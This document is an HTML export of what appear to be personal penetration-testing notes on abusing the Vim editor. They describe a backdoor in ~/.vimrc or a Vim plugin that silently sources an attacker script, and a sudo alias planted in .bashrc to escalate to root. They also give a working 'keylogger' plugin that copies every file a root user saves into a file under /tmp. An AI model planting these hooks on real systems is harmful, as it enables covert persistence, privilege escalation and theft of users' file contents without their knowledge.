<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>vim exploits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>vim exploits</h1><br/><p><h2>VIM simple backdoor</h2><ul><li> <small> ~/.vimrc</small><ul><li><small>execute commands when launching vim</small></li><li><small>~/.vim/plugin also </small></li></ul></li><li><small>vim-specific commands </small></li><li><small>VIM has access to ENV variables </small></li><li><small>execute command on the editor or within .vimrc </small><ul><li><small>:echo &quot;this is a test&quot;</small></li></ul></li><li><small>running unauthorized scripts. </small><ul><li><small>If VIM is not set to use a restricted environment then we can use it to run shell commands from within the config file by prepending the ! character</small></li><li><small>:silent !source ~/.vimrunscript</small></li><li><small>:autocmd BufWritePost * :silent :w! &gt;&gt; /tmp/hackedfromvim.txt4</small></li></ul></li><li>Note<ul><li> <small> In an assessment on an Ubuntu, Red Hat, or similar system, if the user runs VIM via sudo, our script being sourced will also run as root. Because of this, we will achieve root access without any extra effort. On a Debian or similar system that does not persist the user&#39;s shell environment information when moving to a sudo context, we can add an alias10 to the user&#39;s .bashrc file.</small></li><li><strong><small>alias sudo=&quot;sudo -E&quot;</small></strong></li></ul></li></ul></p><p></p><p><h2>VIM keylogger</h2><ul><li>in a constrained vim env <ul><li>:autocmd //triggers when performed action by user </li></ul></li><li></p><p></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">mkdir</span> -p ~/.vim/plugin<br />vi ~/.vim/plugin/settings.vim<br /><br />:if <span style="color:#7f0044;font-weight:400">$USER</span> == <span style="color:#3ad900;font-weight:400">&quot;root&quot;</span><br />:autocmd BufWritePost * :silent :w! <span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> /tmp/hackedfromvim.txt <br />:endif<br /><br /><br /><span style="color:#0088ff;font-weight:400">## autocommand that fires on the BufWritePost action and then writes the content of the file to a log file we specify.</span></pre></div></p></div>
</body>
</html>
